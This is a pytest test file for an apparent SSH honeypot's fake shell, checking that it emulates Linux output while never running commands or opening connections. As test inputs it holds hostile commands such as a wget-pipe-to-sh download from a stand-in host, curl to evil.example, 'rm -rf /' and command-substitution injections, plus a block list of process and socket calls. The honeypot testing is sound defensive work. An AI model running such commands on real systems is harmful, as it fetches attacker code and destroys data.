import re
from pathlib import Path

import pytest

from conftest import ROOT
from sshpot.fakeshell import FakeShell, indicators


@pytest.fixture
def sh():
    return FakeShell("srv04", "root")


def out(sh, line):
    return sh.run(line).output


def test_basic_identity_commands(sh):
    assert out(sh, "whoami") == "root\n"
    assert out(sh, "id").startswith("uid=0(root)")
    assert out(sh, "hostname") == "srv04\n"
    assert out(sh, "uname -r") == "5.15.0-91-generic\n"
    assert "x86_64" in out(sh, "uname -a") and "srv04" in out(sh, "uname -a")
    assert out(sh, "uname") == "Linux\n"


def test_non_root_prompt_and_identity():
    sh = FakeShell("web", "bob")
    assert sh.prompt == "bob@web:~$ " and out(sh, "id").startswith("uid=1000(bob)")


def test_cd_pwd_ls_cat_are_consistent(sh):
    assert sh.prompt == "root@srv04:~# "
    assert out(sh, "cd /etc") == "" and out(sh, "pwd") == "/etc\n"
    assert sh.prompt == "root@srv04:/etc# " and "passwd" in out(sh, "ls")
    assert out(sh, "cd ..") == "" and out(sh, "pwd") == "/\n"
    assert out(sh, "cd /nope").startswith("bash: cd: /nope: No such file")
    assert out(sh, "cat /etc/passwd").startswith("root:x:0:0")
    assert "Ubuntu" in out(sh, "cat /etc/os-release")
    assert out(sh, "cat /nope") == "cat: /nope: No such file or directory\n"
    assert out(sh, "cat /etc") == "cat: /etc: Is a directory\n"
    assert out(sh, "cd /etc && cat hostname") == "srv04\n"


def test_unknown_commands_and_paths(sh):
    assert out(sh, "frobnicate --now") == "frobnicate: command not found\n"
    r = sh.run("./payload")
    assert (
        r.output == "bash: ./payload: No such file or directory\n" and r.status == 127
    )
    assert sh.run("frobnicate").status == 127


def test_operators(sh):
    assert out(sh, "whoami; id").startswith("root\nuid=0")
    assert out(sh, "false_cmd && whoami") == "false_cmd: command not found\n"
    assert out(sh, "false_cmd || whoami") == "false_cmd: command not found\nroot\n"
    assert out(sh, "whoami && echo hi") == "root\nhi\n"


def test_pipes_and_redirects_are_parsed_and_ignored(sh):
    assert out(sh, "cat /etc/hostname | grep srv | head -n 1") == "srv04\n"
    assert out(sh, "echo secret > /tmp/x") == ""
    assert out(sh, "echo a >> /etc/passwd; whoami") == "root\n"
    assert out(sh, "cat /etc/passwd 2>/dev/null | wc -l").startswith("root:x:0:0")


def test_quoting_and_syntax_errors(sh):
    assert out(sh, "echo 'a  b'") == "a  b\n"
    r = sh.run("echo 'unterminated")
    assert "unexpected EOF" in r.output and r.status == 2


def test_exit_variants_and_empty_lines(sh):
    assert sh.run("exit").exit and sh.run("logout").exit and sh.run("whoami; exit").exit
    r = sh.run("   ")
    assert r.output == "" and not r.exit


def test_sudo_and_env_prefixes_are_transparent(sh):
    assert out(sh, "sudo whoami") == "root\n"
    assert out(sh, "nohup sudo id").startswith("uid=0")


def test_silent_commands_succeed_without_effect(sh):
    for cmd in (
        "chmod +x x.sh",
        "rm -rf /",
        "mkdir /tmp/a",
        "kill -9 1",
        "crontab -r",
        "service ssh stop",
    ):
        r = sh.run(cmd)
        assert (r.output, r.status) == ("", 0), cmd
    assert "passwd" in out(sh, "ls /etc")  # nothing was "deleted"
    assert sh.run("rm -rf /").status == 0


def test_downloads_never_connect_and_report_failure(sh):
    r = sh.run("wget http://203.0.113.9/x.sh -O- | sh")
    assert r.output == "wget: unable to resolve host address '203.0.113.9'\n"
    assert r.urls == ["http://203.0.113.9/x.sh"] and r.ips == ["203.0.113.9"]
    assert (
        out(sh, "curl -s http://evil.example/p")
        == "curl: (6) Could not resolve host: evil.example\n"
    )
    assert sh.run("curl evil.example").status == 6


def test_shell_metacharacters_are_never_interpreted(sh, tmp_path):
    marker = tmp_path / "pwned"
    for line in (
        f"echo $(touch {marker})",
        f"echo `touch {marker}`",
        f"touch {marker}",
        f"echo x > {marker}",
        f"cat /etc/passwd > {marker}",
        f"wget file://{marker}",
    ):
        sh.run(line)
    assert not marker.exists()
    assert out(sh, "echo $(whoami)") == "$(whoami)\n"


def test_very_long_input_is_refused(sh):
    r = sh.run("echo " + "A" * 5000)
    assert r.status == 126 and "too long" in r.output


def test_garbage_input_never_raises(sh):
    for line in (
        "\x00\x01",
        ";;;;",
        "||&&",
        ">",
        "< <",
        "'",
        '"',
        "$",
        "`",
        "\\",
        "echo \\",
        "a" * 3000,
        "💥 echo",
    ):
        sh.run(line)


def test_indicators_extract_urls_and_valid_ips():
    urls, ips = indicators(
        "wget http://1.2.3.4:8080/a.sh; curl ftp://x.example/f; ping 999.1.1.1 10.0.0.256 8.8.8.8"
    )
    assert urls == ["http://1.2.3.4:8080/a.sh", "ftp://x.example/f"]
    assert ips == ["1.2.3.4", "8.8.8.8"]


BANNED_IMPORTS = (
    "subprocess",
    "socket",
    "pty",
    "ctypes",
    "multiprocessing",
    "requests",
    "urllib.request",
    "urllib3",
    "http",
    "ssl",
)
BANNED_CALLS = {
    "eval",
    "exec",
    "compile",
    "__import__",
    "os.system",
    "os.popen",
    "os.execv",
    "os.execvp",
    "os.fork",
    "asyncio.create_subprocess_exec",
    "asyncio.create_subprocess_shell",
    "asyncssh.connect",
}


@pytest.mark.parametrize(
    "name", ["fakeshell.py", "server.py", "logs.py", "analytics.py"]
)
def test_source_never_executes_commands_or_opens_sockets(name):
    """Static guard (AST, so docstrings don't count): no process, eval or raw socket."""
    import ast

    tree = ast.parse((ROOT / "sshpot" / name).read_text())
    imported, calls = set(), set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported |= {a.name for a in node.names}
        elif isinstance(node, ast.ImportFrom):
            imported.add(node.module or "")
        elif isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name):
            calls.add(f"{node.value.id}.{node.attr}")
        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            calls.add(node.func.id)
    bad = [
        m
        for m in imported
        if any(m == b or m.startswith(b + ".") for b in BANNED_IMPORTS)
    ]
    assert not bad, bad
    assert not calls & BANNED_CALLS, calls & BANNED_CALLS
